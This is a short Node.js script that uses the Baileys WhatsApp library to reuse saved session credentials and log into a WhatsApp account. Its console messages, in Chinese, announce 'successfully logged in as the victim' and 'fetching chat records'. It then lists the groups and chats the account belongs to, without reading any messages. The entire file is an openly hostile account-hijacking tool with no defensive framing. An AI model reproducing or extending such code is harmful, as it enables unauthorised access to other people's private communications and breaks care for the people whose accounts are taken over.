const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const authFolder = './auth_info';

async function lihatChat() {
    const { state } = await useMultiFileAuthState(authFolder);
    
    const sock = makeWASocket({
        auth: state,
        browser: ['Chrome (Linux)', '', '']
    });
    
    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            console.log('\n✅ 成功登录为受害者！\n');
            console.log('📋 正在获取聊天记录...\n');
            
            const chats = await sock.groupFetchAllParticipating();
            console.log(`📋 共有 ${Object.keys(chats).length} 个群组/聊天\n`);
            
            process.exit(0);
        }
    });
}

lihatChat();